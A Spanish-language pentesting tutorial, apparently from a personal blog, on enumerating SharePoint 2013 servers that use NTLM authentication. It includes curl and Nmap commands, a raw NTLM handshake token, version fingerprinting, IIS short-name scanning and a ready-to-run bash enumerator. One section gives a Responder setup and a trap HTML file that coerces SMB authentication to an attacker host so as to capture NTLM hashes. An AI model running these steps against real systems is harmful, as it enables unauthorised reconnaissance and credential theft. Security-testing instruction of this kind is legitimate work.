---
title: "Enumeración NTLM en SharePoint: Guía Técnica Completa"
description: "Metodología detallada para extraer información valiosa de servidores SharePoint 2013 con autenticación NTLM sin necesidad de credenciales iniciales. Técnicas avanzadas de pentesting y reconocimiento pasivo."
showBreadcrumbs: true
showTableOfContents: false
---

# Enumeración NTLM en SharePoint: Guía Técnica Completa

En este artículo técnico exploraré en detalle cómo realizar una enumeración efectiva de servidores SharePoint que utilizan autenticación NTLM. Este proceso es crucial durante evaluaciones de seguridad para identificar vectores potenciales sin necesidad de credenciales iniciales.

## 1. Verificación del mecanismo de autenticación

El primer paso es confirmar que el servidor está utilizando autenticación NTLM:

```bash
# Análisis básico de cabeceras
curl -I -L http://10.10.10.x
```

**Resultado positivo:**
```
HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/8.5
WWW-Authenticate: NTLM
WWW-Authenticate: Negotiate
X-Powered-By: ASP.NET
```

La presencia de `WWW-Authenticate: NTLM` confirma el uso de autenticación integrada de Windows. También podemos verificar esto con Nmap:

```bash
nmap -p 80,443 --script http-ntlm-info 10.10.10.x
```

## 2. Explotación del handshake NTLM para extraer información interna

La magia del protocolo NTLM es que durante el handshake inicial, el servidor revela información interna valiosa aunque no tengamos credenciales. Esto ocurre porque envía un desafío (challenge) Type 2 que contiene metadatos del servidor.

### Envío manual de solicitud Type 1

```bash
# Solicitud con token NTLM Type 1 genérico
curl -v --header "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" http://10.10.10.x/_layouts/15/
```

**Resultado:**
```
< HTTP/1.1 401 Unauthorized
< WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEAAQADgAAAAFgomi+Tc1Q2htbnIAAAAAAAAAAJAAkABIAAAABgGxHQAAAA9DAE8ATgBUAE8AUwBPAAIAEABDAE8ATgBUAE8AUwBPAAEAEABTAEgAQQBSAEUAUABPAEkATgBUAAQAHgBjAG8AbgB0AG8AcwBvAC4AbABvAGMAYQBsAAMAPABzAGgAYQByAGUAcABvAGkAbgB0AC4AYwBvAG4AdABvAHMAbwAuAGwAbwBjAGEAbAAAAAA=
```

### Decodificación del token NTLM Type 2

Con herramientas como `ntlm-parser` o el script `ntlm-info` de Nmap, podemos extraer información como:

```
Target_Name: CONTOSO
NetBIOS_Domain_Name: CONTOSO
NetBIOS_Computer_Name: SHAREPOINT
DNS_Domain_Name: contoso.local
DNS_Computer_Name: sharepoint.contoso.local
DNS_Tree_Name: contoso.local
Product_Version: 6.3.9600
```

Esta información es un tesoro para un pentester:
- Estructura del dominio: `contoso.local`
- Nombre del servidor: `SHAREPOINT`
- Sistema operativo: Windows Server 2012 R2 (build 6.3.9600)

## 3. Identificación precisa de la versión de SharePoint

Conocer la versión exacta de SharePoint es clave para identificar vulnerabilidades específicas. SharePoint expone esta información en varios lugares:

### A través del archivo service.cnf

```bash
curl -v http://10.10.10.x/_vti_pvt/service.cnf
```

**Resultado positivo:**
```
vti_encoding:SR|utf8-nl
vti_extenderversion:SR|15.0.0.4763
```

El número `15.0.0.4763` indica SharePoint con una actualización específica.

### Mediante cabeceras HTTP

Las páginas que logran cargarse pueden revelar la versión exacta:

```
MicrosoftSharePointTeamServices: 15.0.0.4763
```

## 4. Exploración de recursos potencialmente accesibles

A pesar de la autenticación NTLM, algunos recursos podrían estar accesibles sin credenciales debido a configuraciones incorrectas:

### Búsqueda de servicios web y APIs expuestos

```bash
# Script para probar múltiples endpoints
for endpoint in "_vti_bin/sites.asmx" "_api/web" "_vti_inf.html" "_layouts/15/images/siteicon.png"; do
    echo -e "\n[+] Probando $endpoint:"
    curl -I http://10.10.10.x/$endpoint
done
```

**Resultados esperados:**
- La mayoría devolverán `401 Unauthorized`
- Algunos archivos estáticos pueden devolver `200 OK` si están mal configurados

### Puntos de acceso específicos de SharePoint a verificar

```bash
# Endpoints comunes que a veces filtran información
curl -I http://10.10.10.x/_layouts/15/Authenticate.aspx
curl -I http://10.10.10.x/_layouts/15/AccessDenied.aspx
curl -I http://10.10.10.x/_vti_bin/client.svc
```

## 5. Explotación de vulnerabilidades de nombres cortos de IIS

IIS puede ser vulnerable a la enumeración de nombres cortos 8.3, lo que permite descubrir la existencia de archivos y carpetas sin acceder a ellos:

```bash
# Prueba manual básica
curl -I "http://10.10.10.x/~s"
curl -I "http://10.10.10.x/~c"

# Herramienta automatizada
python3 iis_shortname_scanner.py -u http://10.10.10.x/
```

**Resultado positivo:**
```
[+] Found directory: Secre~1 (probable full name: Secret*)
[+] Found file: web~1.con (probable full name: web.config)
```

## 6. Forzado y captura de hashes NTLM

Aunque estemos en modo enumeración, podemos configurar un escenario para capturar hashes NTLM si algún usuario intenta autenticarse:

```bash
# Configuración de Responder
sudo responder -I eth0 -wrf

# Creación de página HTML maliciosa para forzar autenticación SMB
echo '<img src="\\10.10.10.y\share\imagen.jpg">' > trampa.html
```

Si un usuario accede a esta página mientras está autenticado en el dominio, Responder capturará su hash NTLM:

```
[SMB] NTLMv2-SSP Client   : 10.10.10.x
[SMB] NTLMv2-SSP Username : CONTOSO\sharepoint_svc
[SMB] NTLMv2-SSP Hash     : sharepoint_svc::CONTOSO:72f3430fe8sd7shj:E348A...
```

## 7. Análisis de métodos HTTP permitidos

Los métodos HTTP habilitados pueden revelar vectores adicionales:

```bash
curl -v -X OPTIONS http://10.10.10.x
```

**Resultado:**
```
< HTTP/1.1 200 OK
< Allow: GET, HEAD, POST, OPTIONS, TRACE
```

La presencia de `TRACE` podría indicar vulnerabilidades como Cross-Site Tracing (XST).

## 8. Verificación de WebDAV

Si WebDAV está habilitado, podría proporcionar vías adicionales de acceso:

```bash
# Verificar si WebDAV está habilitado
curl -X PROPFIND -H "Depth: 1" http://10.10.10.x/
```

Una respuesta `207 Multi-Status` indicaría WebDAV activo, mientras que un `405 Method Not Allowed` significaría que no está disponible.

## Comandos listos para usar

A continuación, presento un script bash listo para ejecutar que automatiza la enumeración básica:

```bash
#!/bin/bash
# SharePoint NTLM Enumerator
# Uso: ./sp_ntlm_enum.sh <IP_OBJETIVO>

TARGET=$1
echo "[+] Iniciando enumeración NTLM en SharePoint para $TARGET"

# 1. Verificación de cabeceras básicas
echo -e "\n[+] Verificando cabeceras HTTP:"
curl -s -I -L http://$TARGET | grep -E "Server:|WWW-Authenticate:|X-Powered-By:|MicrosoftSharePointTeamServices:"

# 2. Obtención de información NTLM con Nmap
echo -e "\n[+] Extrayendo información NTLM con Nmap:"
nmap -p 80,443 --script http-ntlm-info $TARGET

# 3. Verificación de archivos de configuración expuestos
echo -e "\n[+] Buscando archivos de configuración:"
curl -s -I http://$TARGET/_vti_pvt/service.cnf

# 4. Prueba de endpoints comunes
echo -e "\n[+] Verificando endpoints específicos de SharePoint:"
for endpoint in "_vti_inf.html" "_vti_bin/sites.asmx" "_api/web" "_layouts/15/AccessDenied.aspx"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" http://$TARGET/$endpoint)
    echo "http://$TARGET/$endpoint - Código HTTP: $code"
done

# 5. Análisis de métodos HTTP
echo -e "\n[+] Métodos HTTP permitidos:"
curl -s -X OPTIONS -I http://$TARGET | grep "Allow:"

echo -e "\n[+] Enumeración completada"
```

## Herramientas alternativas recomendadas

1. **Nuclei** - Para ejecutar plantillas específicas contra SharePoint
   ```bash
   nuclei -u http://10.10.10.x -t technologies/microsoft/sharepoint.yaml
   ```

2. **CrackMapExec** - Para ampliar la enumeración
   ```bash
   crackmapexec http 10.10.10.x --port 80 --ntlm
   ```

3. **SPTools** - Suite específica para enumerar SharePoint
   ```bash
   python3 sptools.py -t http://10.10.10.x
   ```

## Conclusión

La enumeración NTLM en SharePoint demuestra cómo, incluso sin credenciales iniciales, es posible extraer información valiosa del sistema. Estos datos nos permiten:

1. Identificar la estructura de dominio interno
2. Conocer versiones precisas para búsqueda de exploits
3. Descubrir recursos potencialmente accesibles
4. Preparar el terreno para ataques más dirigidos

Es importante destacar que toda esta información se obtiene sin necesidad de autenticación exitosa, aprovechando el diseño del protocolo NTLM y las configuraciones por defecto de SharePoint e IIS.

## Fuentes

- Medium: [Internal Information Disclosure Using Hidden NTLM Authentication](https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)
- Microsoft TechCommunity: [IIS Short Name Enumeration](https://techcommunity.microsoft.com/blog/iis-support-blog/iis-short-name-enumeration/3951320)
- SharePoint StackExchange: [Steps to Deny Anonymous Access to _vti_pvt Directory](https://sharepoint.stackexchange.com/questions/59460/steps-to-deny-anonymous-access-to-vti-pvt-directory-iis7)
- Blog LeakIX: [NTLM Authentication Explained](https://blog.leakix.net/ntlm-authentication-explained/)
- 0xss0rz GitBook: [IIS Tilde Enumeration](https://0xss0rz.gitbook.io/0xss0rz/pentest/web-attacks/iis)
- BlkSthl Blog: [Anonymous Authentication in SharePoint 2013](https://blog.blksthl.com/2012/11/02/anonymous-authentication-always-on-in-sharepoint-2013/)

---
⚠️ **Descargo de responsabilidad**: El contenido de este repositorio es solo para fines educativos e informativos; los autores no se hacen responsables de un uso indebido. Asegúrate de contar con la autorización adecuada antes de utilizarlo, actúa de forma responsable bajo tu propio riesgo y cumple todas las directrices legales y éticas.

---


> *Josfull — Creador, escritor y pentester detrás de cada línea de este sitio.*


